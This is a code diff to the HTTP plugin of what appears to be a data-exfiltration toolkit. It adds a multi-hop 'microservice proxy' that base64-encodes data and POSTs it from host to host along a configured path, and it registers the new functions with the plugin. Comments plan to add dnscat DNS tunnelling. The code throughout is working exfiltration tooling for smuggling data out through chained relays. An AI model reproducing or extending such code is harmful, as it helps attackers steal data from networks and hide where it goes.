@@ -116,17 +116,26 @@ def proxy():
     app_exfiltrate.log_message('info', "[proxy] [http] Starting httpd...")
     server(relay_http_request)
 
+###########################################################
+###########################################################
+## TODO: add dnscat capabilities here IMHO --- I honestly kinda forget how dnscat even works...
+## todo: update headers (maybe take from config file or something like that) -- yah definitely... figure them out in advance??
+    ## (but in an automated way...)
+## todo: write new ms_sender function or something like that
+## todo: TEST!!!
+
 def microserivce_proxy(exfil_object):
     global app
     app = exfil_object
     app_exfiltrate.log_message('info', "[microservice_proxy] [http] Starting httpd...")
     server(relay_ms_request)
 
-## TODO: add dnscat capabilities here IMHO --- I honestly kinda forget how dnscat even works...
-## todo: update headers (maybe take from config file or something like that) -- yah definitely... figure them out in advance??
-    ## (but in an automated way...)
-## todo: write new ms_sender function or something like that
-## todo: TEST!!!
+# note: this might actually end up being the same b/c I just added a janky try-except
+# to the retrive data section
+#def listen_ms():
+#    app_exfiltrate.log_message('info', "[http] Starting httpd...")
+#    server(app_exfiltrate.retrieve_data)
+
 packet_counter = -1
 file_to_send = None
 f = None
@@ -145,8 +154,6 @@ def relay_ms_request(data):
         next_ip = next_position['ip']
         next_port = next_position['port']
         data['path_data']['index'] +=1
-        app_exfiltrate.log_message(
-            'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
 
     else: # if we reached the end of the line, then we gotta (1) get the data and (2) reverse the path and send it back
         # step (1) get the data.
@@ -172,11 +179,17 @@ def relay_ms_request(data):
     packet_counter += 1
     data_to_send = {'data': base64.b64encode(data)}
     target = "http://{}:{}".format(next_ip, next_port)
+    app_exfiltrate.log_message('info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
     requests.post(target, data=data_to_send, headers=headers)
+
+###########################################################
+###########################################################
 
 class Plugin:
     def __init__(self, app, conf):
         global app_exfiltrate, config
         config = conf
         app_exfiltrate = app
-        app.register_plugin('http', {'send': send, 'listen': listen, 'proxy': proxy})
+        app.register_plugin('http', {'send': send, 'listen': listen, 'proxy': proxy,
+                                     "microserivce_proxy": microserivce_proxy,
+                                     "listen_ms": listen})
